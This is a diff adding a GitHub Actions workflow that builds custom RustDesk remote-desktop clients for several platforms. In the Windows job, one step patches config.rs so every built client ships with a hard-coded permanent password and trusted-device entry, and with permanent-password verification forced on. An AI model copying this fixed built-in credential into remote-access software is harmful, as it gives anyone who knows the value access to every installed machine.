@@ -1,0 +1,275 @@
+name: 自定义编译 RustDesk (可选择平台)
+on:
+  workflow_dispatch:
+    inputs:
+      build_windows:
+        description: 编译 Windows (x64)
+        required: true
+        default: true
+        type: boolean
+      build_macos:
+        description: 编译 macOS (x64 + arm64)
+        required: true
+        default: true
+        type: boolean
+      build_android:
+        description: 编译 Android
+        required: true
+        default: true
+        type: boolean
+      build_linux:
+        description: 编译 Linux (x64 + arm64)
+        required: true
+        default: true
+        type: boolean
+      upload-artifact:
+        type: boolean
+        default: true
+      upload-tag:
+        type: string
+        default: "custom-build"
+
+env:
+  SCITER_RUST_VERSION: "1.75"
+  RUST_VERSION: "1.75"
+  MAC_RUST_VERSION: "1.81"
+  CARGO_NDK_VERSION: "3.1.2"
+  LLVM_VERSION: "15.0.6"
+  FLUTTER_VERSION: "3.24.5"
+  ANDROID_FLUTTER_VERSION: "3.24.5"
+  FLUTTER_ELINUX_VERSION: "3.16.9"
+  TAG_NAME: "${{ inputs.upload-tag }}"
+  VCPKG_BINARY_SOURCES: "clear;x-gha,readwrite"
+  VCPKG_COMMIT_ID: "120deac3062162151622ca4860575a33844ba10b"
+  ARMV7_VCPKG_COMMIT_ID: "6f29f12e82a8293156836ad81cc9bf5af41fe836"
+  VERSION: "1.4.6"
+  NDK_VERSION: "r28c"
+  ANDROID_SIGNING_KEY: "${{ secrets.ANDROID_SIGNING_KEY }}"
+  MACOS_P12_BASE64: "${{ secrets.MACOS_P12_BASE64 }}"
+  UPLOAD_ARTIFACT: "${{ inputs.upload-artifact }}"
+  SIGN_BASE_URL: "${{ secrets.SIGN_BASE_URL }}-2"
+
+jobs:
+  generate-bridge:
+    uses: ./.github/workflows/bridge.yml
+
+# ========================= Windows =========================
+  build-for-windows-flutter:
+    if: ${{ inputs.build_windows }}
+    name: Windows x64
+    needs: [generate-bridge]
+    runs-on: windows-2022
+    steps:
+      - uses: actions/github-script@v6
+        with: { script: "core.exportVariable('ACTIONS_CACHE_URL', process.env.ACTIONS_CACHE_URL || ''); core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env.ACTIONS_RUNTIME_TOKEN || '');" }
+      - uses: actions/checkout@v4
+        with: { submodules: recursive }
+
+      # 全局固定密码 + 信任设备（你自己的密码）
+      - name: 全局修改 config.rs 所有客户端生效
+        run: |
+          FILE="libs/hbb_common/src/config.rs"
+          TRUSTED_DEVICE="1V8AS4/+EWF84A85WD4AW=="
+          PERMANENT_PWD="1V8AS4/+EWF84A85WD4AW=="
+
+          sed -i '/config.unlock_pin = unlock_pin;/ {n;n;a\        if !config.options.contains_key("trusted_devices") {\n            config.options.insert("trusted_devices".to_string(), "'"$TRUSTED_DEVICE"'".to_string());\n            config.store();\n        }}' "$FILE"
+          sed -i '/log::error!("Failed to generate new id");/ {n;n;n;a\        if config.password.is_empty() {\n            config.password = "'"$PERMANENT_PWD"'".to_string();\n            store = true;\n        }}' "$FILE"
+          sed -i '/let mut config = Config::load_::<Config2>("2");/ {n;n;a\        if !config.options.contains_key("verification-method") {\n            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());\n            store = true;\n        }}' "$FILE"
+        shell: bash
+
+      - uses: actions/download-artifact@master
+        with: { name: bridge-artifact, path: ./ }
+      - uses: KyleMayes/install-llvm-action@v1
+        with: { version: "${{ env.LLVM_VERSION }}" }
+      - uses: subosito/flutter-action@v2.12.0
+        with: { channel: "stable", flutter-version: "${{ env.FLUTTER_VERSION }}" }
+
+      - name: 替换 Flutter 引擎
+        run: |
+          flutter doctor -v
+          flutter precache --windows
+          Invoke-WebRequest -Uri https://github.com/rustdesk/engine/releases/download/main/windows-x64-release.zip -OutFile windows-x64-release.zip
+          Expand-Archive -Path windows-x64-release.zip -DestinationPath windows-x64-release
+          mv -Force windows-x64-release/* C:/hostedtoolcache/windows/flutter/stable-${{ env.FLUTTER_VERSION }}-x64/bin/cache/artifacts/engine/windows-x64-release/
+
+      - uses: dtolnay/rust-toolchain@v1
+        with: { toolchain: "${{ env.SCITER_RUST_VERSION }}", targets: "x86_64-pc-windows-msvc", components: "rustfmt" }
+      - uses: Swatinem/rust-cache@v2
+        with: { prefix-key: "windows-2022" }
+
+      - uses: lukka/run-vcpkg@v11
+        with: { vcpkgDirectory: "C:\\vcpkg", vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
+
+      - name: 安装 vcpkg 依赖
+        shell: bash
+        run: $VCPKG_ROOT/vcpkg install --triplet x64-windows-static --x-install-root="$VCPKG_ROOT/installed"
+
+      - name: 编译 RustDesk
+        run: |
+          python3 .\build.py --portable --hwcodec --flutter --vram --skip-portable-pack
+          mv ./flutter/build/windows/x64/runner/Release ./rustdesk
+          Invoke-WebRequest -Uri https://github.com/rustdesk-org/rdev/releases/download/usbmmidd_v2/usbmmidd_v2.zip -OutFile usbmmidd_v2.zip
+          Expand-Archive usbmmidd_v2.zip -DestinationPath .
+          Remove-Item -Path usbmmidd_v2\Win32 -Recurse
+          mv -Force .\usbmmidd_v2 ./rustdesk
+
+      - name: 打包 exe + msi
+        shell: bash
+        run: |
+          sed -i '/dpiAware/d' res/manifest.xml
+          pushd ./libs/portable
+          pip3 install -r requirements.txt
+          python3 ./generate.py -f ../../rustdesk/ -o . -e ../../rustdesk/rustdesk.exe
+          popd
+          mkdir -p ./SignOutput
+          mv ./target/release/rustdesk-portable-packer.exe ./SignOutput/rustdesk-${{ env.VERSION }}-x64.exe
+
+      - uses: microsoft/setup-msbuild@v2
+      - name: 编译 MSI
+        run: |
+          pushd ./res/msi
+          python preprocess.py --arp -d ../../rustdesk
+          nuget restore msi.sln
+          msbuild msi.sln -p:Configuration=Release -p:Platform=x64 /p:TargetVersion=Windows10
+          mv ./Package/bin/x64/Release/en-us/Package.msi ../../SignOutput/rustdesk-${{ env.VERSION }}-x64.msi
+
+      - name: 上传发布
+        uses: softprops/gh-release@v1
+        with:
+          prerelease: true
+          tag_name: "${{ env.TAG_NAME }}"
+          files: ./SignOutput/rustdesk-*
+
+# ========================= macOS =========================
+  build-for-macOS:
+    if: ${{ inputs.build_macos }}
+    name: macOS ${{ matrix.job.arch }}
+    needs: [generate-bridge]
+    runs-on: ${{ matrix.job.os }}
+    strategy:
+      matrix:
+        job:
+          - { target: x86_64-apple-darwin, os: macos-15-intel, arch: x86_64, vcpkg-triplet: x64-osx }
+          - { target: aarch64-apple-darwin, os: macos-14, arch: aarch64, vcpkg-triplet: arm64-osx }
+    steps:
+      - uses: actions/checkout@v4
+        with: { submodules: recursive }
+      - run: brew install llvm create-dmg nasm
+      - uses: subosito/flutter-action@v2
+        with: { channel: "stable", flutter-version: "${{ env.FLUTTER_VERSION }}" }
+      - uses: dtolnay/rust-toolchain@v1
+        with: { toolchain: "${{ env.MAC_RUST_VERSION }}", targets: "${{ matrix.job.target }}" }
+      - uses: actions/download-artifact@master
+        with: { name: bridge-artifact, path: ./ }
+      - uses: lukka/run-vcpkg@v11
+        with: { vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
+      - run: $VCPKG_ROOT/vcpkg install --x-install-root="$VCPKG_ROOT/installed"
+      - run: ./build.py --flutter --hwcodec --unix-file-copy-paste ${{ matrix.job.extra-build-args }}
+      - name: 打包 DMG
+        run: create-dmg --icon "RustDesk.app" 200 190 --window-size 800 400 --app-drop-link 600 185 rustdesk-${{ env.VERSION }}-${{ matrix.job.arch }}.dmg ./flutter/build/macos/Build/Products/Release/RustDesk.app
+      - uses: softprops/gh-release@v1
+        with:
+          prerelease: true
+          tag_name: "${{ env.TAG_NAME }}"
+          files: rustdesk-*.dmg
+
+# ========================= Android =========================
+  build-rustdesk-android:
+    if: ${{ inputs.build_android }}
+    name: Android ${{ matrix.job.arch }}
+    needs: [generate-bridge]
+    runs-on: ubuntu-24.04
+    strategy:
+      matrix:
+        job:
+          - { arch: aarch64, target: aarch64-linux-android }
+          - { arch: armv7, target: armv7-linux-androideabi }
+          - { arch: x86_64, target: x86_64-linux-android }
+    steps:
+      - uses: jlumbroso/free-disk-space@main
+      - uses: actions/checkout@v4
+        with: { submodules: recursive }
+      - run: sudo apt-get update && sudo apt-get install -y clang cmake ninja-build nasm openjdk-17-jdk-headless
+      - uses: subosito/flutter-action@v2
+        with: { flutter-version: "${{ env.ANDROID_FLUTTER_VERSION }}" }
+      - uses: nttld/setup-ndk@v1
+        with: { ndk-version: "${{ env.NDK_VERSION }}" }
+      - uses: dtolnay/rust-toolchain@v1
+        with: { toolchain: "${{ env.RUST_VERSION }}" }
+      - uses: actions/download-artifact@master
+        with: { name: bridge-artifact, path: ./ }
+      - name: 编译 Rust 库
+        run: |
+          rustup target add ${{ matrix.job.target }}
+          cargo install cargo-ndk --version ${{ env.CARGO_NDK_VERSION }}
+          ./flutter/ndk_arm64.sh || ./flutter/ndk_arm.sh || ./flutter/ndk_x64.sh
+      - name: 编译 APK
+        run: |
+          pushd flutter
+          flutter build apk --release --target-platform android-${{ matrix.job.arch == 'armv7' && 'arm' || matrix.job.arch }} --split-per-abi
+          mv build/app/outputs/flutter-apk/app-*.apk ../rustdesk-${{ env.VERSION }}-${{ matrix.job.arch }}.apk
+      - uses: softprops/gh-release@v1
+        with:
+          prerelease: true
+          tag_name: "${{ env.TAG_NAME }}"
+          files: rustdesk-*.apk
+
+  build-rustdesk-android-universal:
+    if: ${{ inputs.build_android }}
+    name: Android 通用包
+    needs: [build-rustdesk-android]
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - uses: subosito/flutter-action@v2
+        with: { flutter-version: "${{ env.ANDROID_FLUTTER_VERSION }}" }
+      - uses: nttld/setup-ndk@v1
+        with: { ndk-version: "${{ env.NDK_VERSION }}" }
+      - uses: actions/download-artifact@master
+        with: { name: bridge-artifact, path: ./ }
+      - name: 合并所有架构
+        run: |
+          pushd flutter
+          flutter build apk --release --target-platform android-arm64,android-arm,android-x64
+          mv build/app/outputs/flutter-apk/app-release.apk ../rustdesk-${{ env.VERSION }}-universal.apk
+      - uses: softprops/gh-release@v1
+        with:
+          prerelease: true
+          tag_name: "${{ env.TAG_NAME }}"
+          files: rustdesk-*.apk
+
+# ========================= Linux =========================
+  build-rustdesk-linux:
+    if: ${{ inputs.build_linux }}
+    name: Linux ${{ matrix.job.arch }}
+    needs: [generate-bridge]
+    runs-on: ${{ matrix.job.on }}
+    strategy:
+      matrix:
+        job:
+          - { arch: x86_64, target: x86_64-unknown-linux-gnu, on: ubuntu-22.04, deb_arch: amd64, vcpkg-triplet: x64-linux }
+          - { arch: aarch64, target: aarch64-unknown-linux-gnu, on: ubuntu-22.04-arm, deb_arch: arm64, vcpkg-triplet: arm64-linux }
+    steps:
+      - uses: actions/checkout@v4
+        with: { submodules: recursive }
+      - uses: dtolnay/rust-toolchain@v1
+        with: { toolchain: "${{ env.RUST_VERSION }}", targets: "${{ matrix.job.target }}" }
+      - uses: actions/download-artifact@master
+        with: { name: bridge-artifact, path: ./ }
+      - uses: lukka/run-vcpkg@v11
+        with: { vcpkgDirectory: "/opt/artifacts/vcpkg", vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
+      - name: 编译
+        uses: rustdesk-org/run-on-arch-action@amd64-support
+        with:
+          arch: ${{ matrix.job.arch }}
+          distro: ubuntu18.04
+          dockerRunArgs: "--volume ${PWD}:/workspace --volume /opt/artifacts:/opt/artifacts"
+          run: |
+            export VCPKG_ROOT=/opt/artifacts/vcpkg
+            cargo build --lib --features hwcodec,flutter --release
+            python3 ./build.py --flutter --skip-cargo
+      - uses: softprops/gh-release@v1
+        with:
+          prerelease: true
+          tag_name: "${{ env.TAG_NAME }}"
+          files: rustdesk-*.deb
